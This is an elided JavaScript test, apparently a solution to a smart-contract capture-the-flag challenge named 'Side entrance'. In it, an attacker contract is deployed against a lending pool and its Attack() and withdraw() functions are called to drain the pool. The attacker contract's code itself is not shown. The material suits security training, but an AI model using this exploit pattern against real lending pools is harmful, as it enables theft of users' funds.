...
describe("[Challenge] Side entrance", function () {
  ...
  it("Exploit", async function () {
    ...
    const SideEntranceLenderPoolAttacker =
      await SideEntranceLenderPoolAttackerFactory.deploy(this.pool.address);

    await SideEntranceLenderPoolAttacker.connect(attacker).Attack();
    await SideEntranceLenderPoolAttacker.connect(attacker).withdraw();
  });
